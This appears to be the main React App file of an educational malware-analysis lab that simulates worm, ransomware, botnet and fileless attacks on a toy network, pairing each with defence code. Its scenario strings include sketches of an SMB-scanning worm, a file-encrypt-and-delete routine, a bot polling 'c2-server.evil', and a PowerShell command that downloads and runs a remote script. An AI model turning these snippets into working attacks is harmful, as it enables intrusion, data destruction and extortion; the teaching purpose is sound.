import React, { useState, useEffect, useCallback, useRef } from 'react';
import NetworkMap from './components/NetworkMap';
import ControlPanel from './components/ControlPanel';
import SecurityChat from './components/SecurityChat';
import Whiteboard from './components/Whiteboard';
import VoiceOrb from './components/VoiceOrb';
import SuggestionOverlay from './components/SuggestionOverlay';
import CodeAcademy from './components/CodeAcademy'; // Import new component
import { Node, Packet, SecurityConfig, LogEntry, ScenarioType, Scenario, MalwareParams, Suggestion } from './types';
import { Play, RotateCcw, Bug, GraduationCap, Shield } from 'lucide-react';

const INITIAL_NODES: Node[] = [
  { id: 'router', x: 50, y: 50, type: 'router', status: 'secure', label: 'Gateway' },
  { id: 'fw', x: 50, y: 30, type: 'firewall', status: 'secure', label: 'Firewall' },
  { id: 'srv1', x: 20, y: 20, type: 'server', status: 'secure', label: 'Data Store' },
  { id: 'srv2', x: 80, y: 20, type: 'server', status: 'secure', label: 'App Server' },
  { id: 'cl1', x: 20, y: 80, type: 'client', status: 'secure', label: 'Admin PC' },
  { id: 'cl2', x: 50, y: 85, type: 'client', status: 'secure', label: 'User PC' },
  { id: 'cl3', x: 80, y: 80, type: 'client', status: 'secure', label: 'Guest PC' },
];

const SCENARIOS: Record<ScenarioType, Scenario> = {
  'none': {
    id: 'none',
    name: 'Idle Mode',
    description: 'No active threats.',
    pythonCode: '',
    defenseCode: ''
  },
  'worm': {
    id: 'worm',
    name: 'Network Worm',
    description: 'Self-replicating malware that scans for vulnerable hosts.',
    pythonCode: `# Conceptual Worm Logic (Python)
import socket, ipaddress

def scan_and_infect(network):
    # 1. Recursive Scan
    for ip in ipaddress.IPv4Network(network):
        try:
            # 2. Target SMB port 445
            s = socket.create_connection((str(ip), 445), timeout=1)
            # 3. Send Exploit Payload
            s.send(b"EXPL0IT_PAYL0AD_V1")
            # 4. Self-Replicate
            transfer_self(ip)
        except: continue`,
    defenseCode: `# Defense: Network Segmentation & Patching

# 1. Firewall Rule (Deny Port 445)
# Blocks lateral movement between workstations
# iptables -A INPUT -p tcp --dport 445 -j DROP

# 2. Disable SMBv1 (Registry)
# Set-ItemProperty -Path "HKLM:\\SYSTEM\\...\\Parameters" -Name SMB1 -Value 0`
  },
  'ransomware': {
    id: 'ransomware',
    name: 'Ransomware',
    description: 'Malware that encrypts files and demands payment.',
    pythonCode: `# Conceptual Ransomware Logic
from cryptography.fernet import Fernet
import os, winreg

def start_encryption(root_dir):
    # 1. Generate Key
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # 2. Traverse Filesystem
    for file in os.walk(root_dir):
        # 3. Encrypt & Delete Original
        with open(file, 'rb') as f: data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file + ".enc", 'wb') as f: f.write(encrypted)
        os.remove(file)`,
    defenseCode: `# Defense: Offline Backups & FIM

# 1. File Integrity Monitoring (FIM)
# Watch for rapid file modifications
def on_file_change(event):
    if entropy(event.file) > 7.5:
        isolate_host(event.host_id)

# 2. 3-2-1 Backup Strategy
# Keep 3 copies, 2 media types, 1 offline`
  },
  'botnet': {
    id: 'botnet',
    name: 'DDoS Botnet',
    description: 'Infected devices controlled centrally to attack targets.',
    pythonCode: `# Conceptual Bot Logic
import requests, time

def bot_loop():
    while True:
        # 1. Phone Home (C2 Server)
        cmd = requests.get("http://c2-server.evil/cmd").json()
        
        # 2. Execute Attack
        if cmd['action'] == 'DDOS':
            # UDP Flood
            sock.sendto(random_bytes, (cmd['target'], 80))
        
        time.sleep(30)`,
    defenseCode: `# Defense: Rate Limiting & C2 Blocking

# 1. DNS Sinkholing
# Redirect requests to "c2-server.evil" to a local loopback
# 127.0.0.1 c2-server.evil

# 2. Rate Limiting (Web Server)
# Limit requests per IP per second to prevent flooding`
  },
  'fileless': {
    id: 'fileless',
    name: 'Fileless / Persistence',
    description: 'Modern malware residing in memory/registry, using built-in tools (Living off the Land).',
    pythonCode: `# Conceptual Fileless Logic (PowerShell)

# 1. Download & Execute in RAM (No Disk)
# IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')

# 2. Registry Persistence
# Create 'Run' Key for restart persistence
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "Updater" -Value "powershell -w hidden..."`,
    defenseCode: `# Defense: Behavioral Monitoring (EDR)

# 1. Monitor Process Chains
# Alert if PowerShell is spawned by Word/Excel

# 2. Constrained Language Mode
# $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
# Limits PowerShell capabilities for non-admins`
  }
}

const INITIAL_CONFIG: SecurityConfig = {
  firewallEnabled: true,
  idsEnabled: true,
  antivirusEnabled: true,
  patchingLevel: 'medium',
};

const INITIAL_PARAMS: MalwareParams = {
  polymorphism: 20,
  aggression: 50,
  persistence: false
};

const App: React.FC = () => {
  const [viewMode, setViewMode] = useState<'lab' | 'academy'>('lab'); // State for navigation
  const [nodes, setNodes] = useState<Node[]>(INITIAL_NODES);
  const [packets, setPackets] = useState<Packet[]>([]);
  const [config, setConfig] = useState<SecurityConfig>(INITIAL_CONFIG);
  const [malwareParams, setMalwareParams] = useState<MalwareParams>(INITIAL_PARAMS);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [currentScenario, setCurrentScenario] = useState<ScenarioType>('none');
  const [lessonTopic, setLessonTopic] = useState<string | null>(null);
  const [isSimulating, setIsSimulating] = useState(false);
  
  // Tactical Advisor State
  const [activeSuggestion, setActiveSuggestion] = useState<Suggestion | null>(null);
  const lastSuggestionTime = useRef<number>(0);

  // Add Log Entry
  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    setLogs(prev => [{
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString(),
      message,
      type
    }, ...prev.slice(0, 49)]);
  }, []);

  const handleScenarioSelect = (scenarioId: ScenarioType) => {
    setCurrentScenario(scenarioId);
    setLessonTopic(null); // Reset lesson topic when scenario changes
    handleReset();
    if (scenarioId !== 'none') {
      addLog(`Class in session: ${SCENARIOS[scenarioId].name}.`, 'warning');
      setIsSimulating(true);
      
      // Seed initial infection
      setTimeout(() => {
          setNodes(prev => {
              const victim = prev.find(n => n.type === 'client');
              if (victim) {
                  addLog(`Simulation Start: ${victim.label} infected.`, 'alert');
                  return prev.map(n => n.id === victim.id ? { 
                    ...n, 
                    status: 'infected',
                    isPersistent: malwareParams.persistence // Initial seed gets persistence if enabled
                  } : n);
              }
              return prev;
          });
      }, 1000);
    }
  };

  const handleUpdateParams = (newParams: Partial<MalwareParams>) => {
    setMalwareParams(prev => ({ ...prev, ...newParams }));
  };

  // --- Tactical Advisor Logic (The "Own Suggestions" Feature) ---
  const checkForSuggestions = useCallback(() => {
    if (!isSimulating || currentScenario === 'none' || activeSuggestion) return;

    const now = Date.now();
    if (now - lastSuggestionTime.current < 8000) return; // Debounce suggestions (8s)

    const infectedCount = nodes.filter(n => n.status !== 'secure').length;
    const infectionRate = infectedCount / nodes.length;

    // 1. Critical: Rapid Spread Check
    if (infectionRate > 0.4 && config.patchingLevel === 'low') {
        setActiveSuggestion({
            id: 'patch-crit',
            type: 'critical',
            title: 'Critical Outbreak Detected',
            message: 'Infection rate exceeds 40%. Low patch levels are allowing rapid spread via known vulnerabilities.',
            actionLabel: 'Emergency Patching',
            onAction: () => {
                setConfig(prev => ({...prev, patchingLevel: 'high'}));
                addLog('Tactical AI: Patch Level raised to HIGH.', 'success');
            },
            lessonTopic: 'Vulnerability Management'
        });
        lastSuggestionTime.current = now;
        return;
    }

    // 2. Scenario Specific: Worm vs Firewall
    if (currentScenario === 'worm' && !config.firewallEnabled && infectedCount > 1) {
        setActiveSuggestion({
            id: 'worm-fw',
            type: 'critical',
            title: 'Lateral Movement Detected',
            message: 'The worm is spreading via Port 445 (SMB). Your Firewall is currently DISABLED.',
            actionLabel: 'Enable Firewall',
            onAction: () => {
                setConfig(prev => ({...prev, firewallEnabled: true}));
                addLog('Tactical AI: Firewall Enabled.', 'success');
            },
            lessonTopic: 'Python: Socket'
        });
        lastSuggestionTime.current = now;
        return;
    }

    // 3. Scenario Specific: Fileless vs Persistence
    if (currentScenario === 'fileless' && malwareParams.persistence && !activeSuggestion) {
        const persistentNode = nodes.find(n => n.isPersistent);
        if (persistentNode && persistentNode.status === 'secure') {
            // It was cleaned but is still persistent
             setActiveSuggestion({
                id: 'fileless-persist',
                type: 'improvement',
                title: 'Hidden Threat Remains',
                message: `Node ${persistentNode.label} was cleaned, but Registry Persistence keys remain active. It will reinfect soon.`,
                lessonTopic: 'Python: WinReg', // Direct link to learn the module
            });
            lastSuggestionTime.current = now;
            return;
        }
    }

    // 4. General Improvement: IDS
    if (malwareParams.aggression > 70 && !config.idsEnabled && Math.random() < 0.3) {
        setActiveSuggestion({
            id: 'high-noise',
            type: 'improvement',
            title: 'High Network Noise',
            message: 'The malware is aggressive. An Intrusion Detection System (IDS) would easily spot these patterns.',
            actionLabel: 'Activate IDS',
            onAction: () => {
                setConfig(prev => ({...prev, idsEnabled: true}));
                addLog('Tactical AI: IDS Activated.', 'success');
            },
            lessonTopic: 'Network Sniffing'
        });
        lastSuggestionTime.current = now;
        return;
    }

  }, [isSimulating, currentScenario, nodes, config, malwareParams, activeSuggestion, addLog]);


  // Simulation Step
  useEffect(() => {
    if (!isSimulating || currentScenario === 'none') return;

    // Run Advisor Check
    checkForSuggestions();

    const interval = setInterval(() => {
      // 1. Remediation Phase (Defenders trying to clean up)
      if (Math.random() < 0.05) { // 5% chance per tick to attempt clean
        setNodes(currentNodes => currentNodes.map(n => {
          // Fix: Handle secure nodes first to allow for re-infection check logic which was previously unreachable
          if (n.status === 'secure') {
             // Re-infection Logic for Persistent nodes that were cleaned previously
             if (n.isPersistent && malwareParams.persistence) {
                 // INCREASED: 90% chance to re-infect (Persistent Rootkit behavior)
                 if (Math.random() < 0.9) { 
                     addLog(`${n.label} RE-INFECTED via Registry Persistence! (Rootkit Active)`, 'alert');
                     return { ...n, status: 'infected' };
                 }
             }
             return n;
          }
          
          // Clean chance depends on Patch Level and Inverse of Polymorphism
          let cleanChance = config.patchingLevel === 'low' ? 0.1 : config.patchingLevel === 'medium' ? 0.3 : 0.6;
          // Polymorphism logic update: if polymorphism is high (100), cleanChance drops to 0.
          // Formula: if poly is 100, (1 - 100/105) approx 0.05. Very hard to clean.
          cleanChance = cleanChance * (1 - (malwareParams.polymorphism / 105)); 

          if (config.antivirusEnabled && Math.random() < cleanChance) {
             // Successful clean
             if (n.isPersistent && malwareParams.persistence) {
                 // But wait! It's persistent!
                 addLog(`${n.label} cleaned, but persistence artifacts remain...`, 'warning');
                 return { ...n, status: 'secure' }; // Cleaned, but isPersistent flag stays true
             } else {
                 addLog(`${n.label} successfully remediated.`, 'success');
                 return { ...n, status: 'secure', isPersistent: false };
             }
          }

          return n;
        }));
      }

      // 2. Spread/Action Phase
      // Packet spawn rate depends on Aggression
      const spawnChance = 0.05 + (malwareParams.aggression / 200); // 0.05 to 0.55
      
      if (Math.random() < spawnChance) { 
        const infectedNodes = nodes.filter(n => n.status !== 'secure');
        
        if (infectedNodes.length > 0) {
            const source = infectedNodes[Math.floor(Math.random() * infectedNodes.length)];
            const targets = nodes.filter(n => n.id !== source.id);
            const target = targets[Math.floor(Math.random() * targets.length)];
            
            let packetType: Packet['type'] = 'legitimate';
            
            // Logic based on Scenario
            if (currentScenario === 'worm') packetType = Math.random() < 0.8 ? 'malware' : 'probe';
            else if (currentScenario === 'ransomware') packetType = Math.random() < 0.3 ? 'malware' : 'legitimate'; // Less network noise
            else if (currentScenario === 'botnet') packetType = source.status === 'bot' ? 'data_exfil' : 'malware';
            else if (currentScenario === 'fileless') packetType = Math.random() < 0.6 ? 'malware' : 'probe'; // Stealthy

            if (target) {
                const newPacket: Packet = {
                  id: Math.random().toString(36).substr(2, 9),
                  sourceId: source.id,
                  targetId: target.id,
                  progress: 0,
                  type: packetType,
                  blocked: false
                };
                setPackets(prev => [...prev, newPacket]);
            }
        }
      }

      // 3. Packet Movement & Detection
      setPackets(prevPackets => {
        const nextPackets = prevPackets.map(p => {
          if (p.progress >= 100 || p.blocked) return { ...p, progress: p.progress + 2 };

          let blocked = false;
          let blockedBy = '';

          // A. Firewall
          if (config.firewallEnabled && !p.blocked) {
              if (p.type === 'probe' && Math.random() < 0.9) { blocked = true; blockedBy = 'Firewall'; }
              // Fileless often uses legitimate ports (HTTP/HTTPS), firewall might miss it unless DPI
              if (currentScenario === 'fileless' && p.type === 'malware') {
                  // Harder to block fileless C2 traffic
                  if (Math.random() < 0.2) { blocked = true; blockedBy = 'Firewall'; }
              }
          }

          // B. IDS
          if (config.idsEnabled && !blocked) {
              // Aggression increases detection chance
              let detectionChance = 0.6 + (malwareParams.aggression / 300); 
              if (currentScenario === 'fileless') detectionChance -= 0.3; // Harder to detect

              if (p.type === 'malware' && Math.random() < detectionChance) {
                  blocked = true;
                  blockedBy = 'IDS';
              }
          }

          // C. Endpoint Protection (AV/EDR)
          if (p.progress > 90 && !blocked && !p.blocked) {
              if (p.type === 'malware') {
                  const vulnChance = config.patchingLevel === 'low' ? 0.9 : config.patchingLevel === 'medium' ? 0.5 : 0.2;
                  
                  // AV Detection vs Polymorphism (Bypass Logic)
                  let avEfficiency = 0.85; // Base
                  // Updated: If polymorphism is > 90, AV efficiency drops to near 0.
                  avEfficiency -= (malwareParams.polymorphism / 110); 

                  if (config.antivirusEnabled && Math.random() < avEfficiency) {
                      blocked = true;
                      blockedBy = 'Endpoint AV';
                  } 
                  
                  // Infection Event
                  if (!blocked && Math.random() < vulnChance) {
                      const targetNode = nodes.find(n => n.id === p.targetId);
                      if (targetNode && targetNode.status === 'secure' && targetNode.type !== 'firewall' && targetNode.type !== 'router') {
                          setTimeout(() => {
                              setNodes(curr => curr.map(n => {
                                  if (n.id === p.targetId) {
                                      let newStatus: Node['status'] = 'infected';
                                      if (currentScenario === 'ransomware') newStatus = 'encrypted';
                                      if (currentScenario === 'botnet') newStatus = 'bot';
                                      
                                      addLog(`${n.label} infected via ${currentScenario}!`, 'alert');
                                      return { 
                                          ...n, 
                                          status: newStatus,
                                          isPersistent: malwareParams.persistence // Inherit persistence setting
                                      };
                                  }
                                  return n;
                              }));
                          }, 0);
                      }
                  }
              }
          }

          if (blocked) {
              return { ...p, blocked: true, blockedBy };
          }

          return { ...p, progress: p.progress + 2 };
        });

        return nextPackets.filter(p => p.progress < 100 || p.blocked && p.progress < 100); 
      });

    }, 50);

    return () => clearInterval(interval);
  }, [isSimulating, nodes, config, addLog, currentScenario, malwareParams, checkForSuggestions]);

  const toggleConfig = (key: keyof SecurityConfig) => {
    setConfig(prev => {
        const newVal = !prev[key];
        addLog(`${key.replace(/([A-Z])/g, ' $1')} ${newVal ? 'Enabled' : 'Disabled'}`, 'warning');
        return { ...prev, [key]: newVal };
    });
  };

  const setPatchLevel = (level: 'low' | 'medium' | 'high') => {
    setConfig(prev => ({ ...prev, patchingLevel: level }));
    addLog(`Patch Policy updated to: ${level.toUpperCase()}`, 'info');
  };

  const handleReset = () => {
    setNodes(INITIAL_NODES);
    setPackets([]);
    setLogs([]);
    setIsSimulating(false);
    setLessonTopic(null);
    setActiveSuggestion(null);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-200 p-4 md:p-8 font-inter">
      <header className="max-w-7xl mx-auto mb-8 flex flex-col md:flex-row items-center justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-red-400 to-orange-600 bg-clip-text text-transparent flex items-center gap-3">
            <Bug className="text-red-500 w-8 h-8" />
            Malware Analysis Lab
          </h1>
          <p className="text-slate-400 mt-1">Interactive Education Platform for Threat Analysis & Defense Coding</p>
        </div>
        
        {/* Main Navigation Toggle */}
        <div className="flex bg-slate-800 p-1 rounded-lg border border-slate-700">
           <button 
             onClick={() => setViewMode('lab')}
             className={`px-4 py-2 rounded-md flex items-center gap-2 text-sm font-medium transition-all ${
               viewMode === 'lab' 
               ? 'bg-slate-700 text-white shadow-sm' 
               : 'text-slate-400 hover:text-white'
             }`}
           >
             <Shield className="w-4 h-4" /> Defense Lab
           </button>
           <button 
             onClick={() => setViewMode('academy')}
             className={`px-4 py-2 rounded-md flex items-center gap-2 text-sm font-medium transition-all ${
               viewMode === 'academy' 
               ? 'bg-green-900/40 text-green-300 border border-green-800 shadow-sm' 
               : 'text-slate-400 hover:text-white'
             }`}
           >
             <GraduationCap className="w-4 h-4" /> Code Academy
           </button>
        </div>

        <div className="flex gap-3">
          <button 
            onClick={handleReset}
            className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-600 flex items-center gap-2 transition-colors"
          >
            <RotateCcw className="w-4 h-4" /> Reset
          </button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto">
        {viewMode === 'lab' ? (
           <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 animate-fade-in">
              <div className="lg:col-span-2 space-y-6">
                <ControlPanel 
                  config={config} 
                  logs={logs} 
                  currentScenario={currentScenario}
                  malwareParams={malwareParams}
                  onToggleConfig={toggleConfig} 
                  onSetPatchLevel={setPatchLevel}
                  onSelectScenario={handleScenarioSelect}
                  onUpdateParams={handleUpdateParams}
                  onSelectLessonTopic={setLessonTopic} 
                />
                <VoiceOrb scenario={SCENARIOS[currentScenario]} />
                <Whiteboard 
                  scenario={SCENARIOS[currentScenario]} 
                  lessonTopic={lessonTopic} 
                />
              </div>
              <div className="lg:col-span-1 space-y-6">
                <NetworkMap 
                  nodes={nodes} 
                  packets={packets} 
                  config={config}
                  onNodeClick={(node) => addLog(`Analysis of ${node.label}: [${node.status.toUpperCase()}] ${node.isPersistent ? '(PERSISTENCE DETECTED)' : ''}`)} 
                />
                <SecurityChat logs={logs} />
              </div>
           </div>
        ) : (
           <CodeAcademy />
        )}
      </main>

      {/* Proactive Tactical Suggestions Overlay - Only in Lab Mode */}
      {viewMode === 'lab' && (
        <SuggestionOverlay 
          suggestion={activeSuggestion} 
          onDismiss={() => setActiveSuggestion(null)} 
          onLearn={(topic) => {
              setLessonTopic(topic);
              setActiveSuggestion(null);
          }}
        />
      )}
    </div>
  );
};

export default App;
